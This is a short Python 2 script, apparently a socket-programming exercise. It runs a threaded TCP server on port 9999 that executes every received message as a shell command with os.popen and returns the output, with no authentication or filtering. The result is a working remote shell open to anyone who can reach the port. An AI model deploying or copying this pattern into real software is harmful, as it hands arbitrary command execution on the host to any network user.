#!/usr/bin/env python
#_*_ coding:utf8 _*_

import SocketServer
import os

class MyTcpHandler(SocketServer.BaseRequestHandler):
	def handle(self):
		while True:
			self.data = self.request.recv(1024)
			if not self.data:break
			cmd = os.popen(self.data)
			result = cmd.read()
			self.request.sendall(result)
			
host,port = '',9999

server = SocketServer.ThreadingTCPServer((host,port),MyTcpHandler)
server.serve_forever()
